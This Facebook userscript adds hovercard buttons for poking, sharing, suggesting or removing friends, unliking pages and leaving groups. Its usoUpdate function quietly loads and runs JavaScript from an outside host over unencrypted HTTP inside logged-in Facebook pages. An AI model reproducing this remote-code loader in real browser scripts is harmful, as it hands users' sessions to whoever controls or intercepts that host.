// ==UserScript==
// @name           Facebook Arkadaş Özellik
// @namespace      http://www.msnkopatforum.tk
// @description    Facebook.com - Arkadaşlarınızı dürtün,paylaşın özel özellikler
// @version        1.0
// --------------------------------------------------------------[ FF ]-
// @include        http://*.facebook.com/*
// ----------------------------------------------------------[ CHROME ]-
// @match          http://*.facebook.com/*
// @run-at         document-start
// ==/UserScript==


function c1(q,root){return document.evaluate(q,root?root:document,null,9,null).singleNodeValue;}
function g(id){if(id&&typeof id==='string'){id=document.getElementById(id);}return id||null;}
function regexx(s,rg){var rs;if(rs=s.match(rg)){return rs[1]?rs[1]:rs[0]||rs;}}

const gm_class = 'uiListItem uiListHorizontalItemBorder uiListHorizontalItem';
const gm_class_ul = 'uiList uiListHorizontal clearfix';
const gm_class_div = 'pvs phm actions gray_box';
const gm_class_ul_new = 'yod_ul ' + gm_class_ul;
const dom = "DOMNodeInserted";
var t3, t2, t1; // timeout
var penetration = false; // first running

const script_id = 88644;
const script_version = '1.0';

var spritemap = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAHAAAAAQCAYAAADOFPsRAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAABs5JREFUeNrcmQlQE1cYgP8NCXJEAwOFgiDiCVq15RDROiAe1RY8KOpUsFAPwAN70cEZtUXrMVrGY7CKYDs4hc6gVqhQQQfQKiLKMQIWdIpAhIiIGkICOSBs9y3skpskQLX9ZzZv3//y3u6+7/3v//9dDMdxwHuBloy8WvwFXwwSaQ98HTEbg0EEY8B/XhSfX5d89dkqnDo/di4TexPunalYyS/h4o3NAqX6ojku2OuavHvVPPxAUjE8e9Gpsd3fxxGOxC4Z0fsrC3egoa3T0H4yPiybKAKNHD5ne3xa0LAB/KuuDVTrBECDQCSmF+PXbv896P+XzJsMO9bPxbSB2590G9xcbeDMvqVax1ix9Tf63HN98g9E8R5xyPV4Zm75L5Eb9IHnseZDAPErsv6C+xxeLv4eUo4lgvfA3wI3hgYYNfk/pRfS4DfuuoQ/ahiY/6wfw8iytLoZbtxrgNsVXLrNxdEKTuwKBFtrS4xpyAWXJXPw3EiBzhWP4OUkhQ86VmD0OQRQTe+zNhWf6GwFl0+tJixPROrqm/hQUtlMlELigVpI3aRxVhC3ebZiVwSPhWEYSyCSdLPNTU0YDIy+V4FI2s1hjzJFa404ZmizMkXx3LwFcAH3X9kKEbx5Hn3GgmCt3JZGniPd8gB3OByrvJBDYzMgPWGtsgUymf0ODVOpGwjRGHn2Uogji0JQghe70/BulnEh71Yj8FqFcDXlE13XlRPwTPkd4vYtIV6TL+TXtHb3yHsRRJFYJt++xtslObPioYUZcwzh9tWs1CNojrJvt56o972Pcphp5FMXam0p+jVKZ0/u03b1LfQjv4mQ8UctuUbr8CRo7siEnGSgV+dC32WwxHajRog/Z1XiQwGoCd6fpY1wtYgLC3ycoemZYNAx2oUSWVSw56TYsLluvjOc7SIPZt+Xynp69kYtcA9dOsNprN0Y1u7T1+vY5iwzxX5e51owcrtUgWiMZJ+/AKXFd8B7ri8ErVlN6irLyuFJfT2MmzABZnl5jlwQM96BgxHW1weC+D0cdFFjJ6QfTku8VlyHz/dyUoKHpOZxGwT6T4JOsVSvcUZbmJpcLKhp853pbDf/3XE2B7cGuHNbBGIEr4HX3nX6YhmPsEATTX2HCyKCR5UUQASPKkcU4IVrD2krasYz0U6rtSMFMS966BD3nCiChLgAJXilD57CS74UTqaXQ2dXN6lzc7XFgxdN03o9tF0Su2Zv9KGc+we3Lpy+ws/NAenvVDW9+uJoXrVEJu9lmjDeiPBfk4y1H2M8wONppbhUIif93w35B4N2jMsOgeGwwEv5NeSimexiraT3fseRPJCIiZy0vUMC0d9dBQKgzvEYDAZIZbLeJ62CLkrHaxNKOjplPWajNFsfHXFqsL6K81eUFVWhGtMJGoKzM/CamsiSEo61NQj4fLLUJlNd34LzudV0/f11Z/TyhUwleNAHLyuiFRIfRZCQFIXygbrgLfCZQkaYaglPf2RKtaE0grTklHuk9SlKS1ufJRLWBGJJn/U18tr1WhCiLql8b5Q/6fPuPuDxeW0dkpCF0xzftmGbbTt8pZLBxDB94ZWnnCa3VsVEfvOXMapphJKEfBoGJw4cIks6mvWdA4VXcslSm5z9PljjfBIgcQoiBRWJn7frAEAaXm8fPCQxU1OJQ3mwlan2UAC5Oi3PimNBQtSUNlAQs0+FK/VXtD4EL6ugFvJuPlEbIz5mnk54KFXYFuLlguDV8/hdMQm5VcJOaY8Nx4Ll5+FiGx/lP2VnYn4t28JU3dKyS1Q0JUrwDAlgkCCIKJBBgQvlAxFEQwOZTau9IC4hj04jbqVFYWoWKOzsgnLzVTQ8XaLPtokg6muZqpZHwftmkzeELJ5u0ASiPO/s7xWPnOw5rKRLZTyptEduZspk7EjIrY6P9J9yKLXoPgGPrSmAGQ4fRsHTVjcmkAlf4YnNDzuD69xC938eQDyAgAxKdEH0muCvtW3DylmYajpB6egtKNwXYvZfVrqZuxkRWPNzAU4EF2TdWHj9z4Kbm7FG70kqfEyUDCKPJQdlEI5950nC8sxJeL2qwdtwyb7jR0ckuEH+EYmttaXuKBRZFwUR+cCCO7l0m7PDeLA3H6/3RVXhUZK4e7ma3smOgz3ni3BLc1afHzEcHpnbojcsKEm3NFffItkDOhTI8IyZSOG0htcSnSL/iHzhoAAVIeq7XRoCT5fYWbMx4ujPQA0Xfd5tGisZtfvxte67MZF7I1SxiqHl4+sDQVOHIOfIt3uNfplNv/kZ5KsOEchonFNM9XOSoa/M/g+fk4YiGIahVWdqZHcZMf+ioVz/HwEGAFH/+m17KLfeAAAAAElFTkSuQmCC';

var style = 'background-image: url(\''+spritemap+'\'); background-repeat: no-repeat; display: inline-block; height: 16px; width: 16px;';

function checkthebox(box) {
  return c1('.//ul[contains(@class,"' + gm_class_ul + '")]', box);
}

function doInject(box) {
  var dummy, is_fbpage, fbpageUrl, fbpageId, fb_isnotfan, groupId, groupId_ismember,
      fb_id, div, ul, ul_new, target, str = '';

  if (t3) clearTimeout(t3);
  if (!(div = c1('.//div[contains(@class,"' + gm_class_div + '")]', box))) {

    // Check if PAGE --
    is_fbpage = regexx(box.innerHTML, />(,|\d+)*.?people like this\./);
    if (is_fbpage) {
      if (fb_isnotfan = c1('.//a[contains(@ajaxify,"&add=1&")]', box)) {
        // inner Ajax
        fbpageId = regexx(fb_isnotfan.getAttribute('ajaxify'), /fbpage_id=(\d+)&/);
      } else {
        if (fbpageUrl = c1('.//a[contains(@href,"facebook.com/pages/")]', box)) {
          // page URL
          fbpageId = regexx(fbpageUrl.href, /\/(\d+)$/);
        }
        else if (fbpageUrl = c1('.//a/img[contains(@class,"mrm photo img")]', box)) {
          // from photo profile
          fbpageId = regexx(fbpageUrl.style.backgroundImage, /\d{7,}/);
        }
      }
    }

    // Check if GROUP --
    else if (groupId = regexx(box.innerHTML, /\/group\.php\?gid=(\d+)"/)) {
      // not a member yet, ignore it!
      if (regexx(box.innerHTML, /\/ajax\/groups\/confirm_join_dialog\.php\?gid=(\d+)/)) return;
    }

    // Or Die carefully --
    else return;

    if (fbpageId || groupId) {
      var stage = c1('.//div[contains(@class,"stage")]', box);
      if (stage && stage.firstChild) {

        // Create faked place to inject --

        if (fbpageId) { // Check if PAGE --

          str = '<div class="' + gm_class_div +'"><ul class="' + gm_class_ul +'">'
            + '<li class="' + gm_class +'"><!--fan_status.php?fbpage_id=' + fbpageId + '--></li>'
            + '</ul></div>';

        } else if (groupId) { // Check if GROUP --

          str = '<div class="' + gm_class_div +'">'
            + '<ul class="' + gm_class_ul +'">'
            + '<li class="' + gm_class +'"><!--/group.php?gid=' + groupId.trim() + '--></li>'
            + '</ul></div>';
        }

        else return; // Or Die carefully --

        stage.innerHTML = '<div data-hovercard-layout="HovercardWithFooter">'+stage.innerHTML+str+'</div>';
        box.firstChild.className = 'hovercard HovercardWithFooter';
        // and return as NORMAL Way
        return doInject(box);
      }
    } else return; // Or Die carefully --
  }

  // Fail to inject --
  if (!(ul = checkthebox(div)) && box) return;
  else {
    // Die if no place to inject --
    if (!(target = c1('.//li[contains(@class,"' + gm_class + '")]', ul))) return;
    if (!(fbpageId = regexx(target.innerHTML, /fan_status\.php\?fbpage_id=(\d+)/)))
      groupId = regexx(target.innerHTML, /\/group\.php\?gid=(\d+)/);

    if (!c1('.//ul[contains(@class,"' + gm_class_ul_new + '")]', box) && target) {

      if (fbpageId) {
        // Pages --

        fb_isnotfan = c1('.//a[contains(@ajaxify,"&add=1&")]', target);

        target.innerHTML += fb_isnotfan ? '' :
         '<span id="span_yod_' + fbpageId + '">'
          + '<a class="action actionspro_a" title="Unlike this" href="#" '
          + 'rel="async-post" ajaxify="/ajax/pages/fan_status.php?'
          + 'fbpage_id=' + fbpageId + '&add=0&reload=0&preserve_tab=0&use_primer=1&source=hovercard'
          + '&span_id=span_yod_' + fbpageId + '">'
          + '<i class="mrs img" style="'+ style +'background-position: -96px top;"></i>'
          + 'Unlike this</a></span>';

        // Suggest be Fans of Page --
        str += '<li class="' + gm_class + '" style="padding-right:10px;">'
          + '<a title="Suggest this Page to Friends" class="action actionspro_a" '
          + 'href="/ajax/social_graph/invite_dialog.php?class=FanManager&node_id=' + fbpageId + '" rel="dialog-post">'
          + '<i class="mrs img" style="'+ style +'background-position: -16px top;"></i>'
          + 'Ark.Öner</a>'
          + '</li>';

        // Add to My Page's Favorites --
        str += '<li class="' + gm_class + '" style="padding-right:10px;">'
          + '<a title="Add to My Page\'s Favorites" class="action actionspro_a" '
          + 'href="/ajax/pages/favorite_status.php?fbpage_id=' + fbpageId + '&add=1" rel="dialog-post">'
          + '<i class="mrs img" style="'+ style +'background-position: -64px top;"></i>'
          + 'Add to My Page\'s Favorites</a>'
          + '</li>';

      } else if (groupId) {
        // Groups --

        var gname = c1('.//div[contains(@class,"fsl")]/a[contains(@href,"/group.php?gid=")]', box);
        gname = gname ? gname.textContent.trim() : 'This Group';

        // Leave Group -- (todo: still BETA)
        str += '<li class="' + gm_class + '" style="padding-right:10px;">'
          + '<a title="Leave Group" class="action actionspro_a" '
          + 'href="#" onclick="return group_ask_leave(\'' + groupId + '\', \'0\', \'\', \'' + gname + '\')">'
          + '<i class="mrs img" style="'+ style +'background-position: -80px top;"></i>'
          + 'Leave Group</a>'
          + '</li>';

      } else {
        // Persons --

        // Die if no FB Id --
        if (!(fb_id = regexx(target.innerHTML, /id=(\d+)/))) return;
        // So, we are new friend? --
        var newfiend = regexx(target.innerHTML, /connect\.php\?profile_id=(\d+)/);

        // Suggest Friends --
        str += '<li class="' + gm_class + '" style="padding-right:10px;">'
          + '<a title="Suggest to Friends" class="action actionspro_a" '
          + 'href="/ajax/friend_suggester_dialog.php?newcomer=' + fb_id + ''
          + '&close_handler=null&ref=profile_others" rel="async">'
          + '<i class="mrs img" style="'+ style +'background-position: 0px top;"></i>'
          + 'Arkadaş Öner</a>'
          + '</li>';

        // Share Friends --
        str += '<li class="' + gm_class + '" style="padding-right:10px;">'
          + '<a title="Share to friends / post to profile" class="action actionspro_a" '
          + 'href="/ajax/share_dialog.php?s=1&appid=2327158227&p[]=' + fb_id +'" rel="dialog">'
          + '<i class="mrs img" style="'+ style +'background-position: -16px top;"></i>'
          + 'Paylaş</a>'
          + '</li>';

        // Poke Friends --
        str += '<li class="' + gm_class + '" style="padding-right:10px;">'
          + '<a title="Poke this Person" class="action actionspro_a" '
          + 'href="/ajax/poke_dialog.php?uid=' + fb_id + '&pokeback=0" rel="dialog">'
          + '<i class="mrs img" style="'+ style +'background-position: -32px top;"></i>'
          + 'Dürt</a>'
          + '</li>';

        if (!newfiend) {
          // Remove Friends --
          str += '<li class="' + gm_class + '">'
            + '<a title="Remove this Person" class="action actionspro_a" '
            + 'href="/ajax/profile/removefriendconfirm.php?uid=' + fb_id + '&pokeback=0" rel="dialog-post">'
            + '<i class="mrs img" style="'+ style +'background-position: -48px top;"></i>'
            + 'Ark. Sil</a>'
            + '</li>';

        }
      }

      ul_new = document.createElement('ul');
      ul_new.className = gm_class_ul_new;
      ul_new.setAttribute('style', 'padding-top: 5px !important;');
      ul_new.innerHTML = str;
      div.appendChild(ul_new);
    }
  }
}

function bindbox(box) {
  if (t2) clearTimeout(t2);
  content.removeEventListener(dom, doListen, false);
  if (box) {
    penetration = true;
    if (box.currentTarget) {
      box = box.currentTarget;
    }
    t3 = setTimeout(function() { doInject(box); }, 10);
  }
}

function findbox(ev) {
  if (/DIV/.test(ev.target.tagName) && /HovercardOverlay/.test(ev.target.className)) {
    var HovercardOverlay = ev.target;
    HovercardOverlay.addEventListener(dom, bindbox, false);
    if (!penetration) bindbox(HovercardOverlay);
  }
}

function doListen(ev) {
  t2 = setTimeout(function() { findbox(ev); }, 10);
}

function usoUpdate(el) {
  if (el) {
    var s_gm = document.createElement('script');
    s_gm.type = 'text/javascript';
    s_gm.src = 'http://project.krakenstein.cz.cc/usoupdater/?id=' + script_id + '&ver=' + script_version;
    //s_gm.src = 'http://127.0.0.1/test/usoupdater/?id=' + script_id + '&ver=' + script_version;
    el.appendChild(s_gm);
  }
}

function starter() {
  //content = g('content');
  content = document.body;
  if (content) {
    content.addEventListener(dom, doListen, false);
    if (t1) clearTimeout(t1);
    usoUpdate(content);
  }
  return false;
}

function Boot() {
  t1 = setTimeout(starter, 1000);
}

Boot();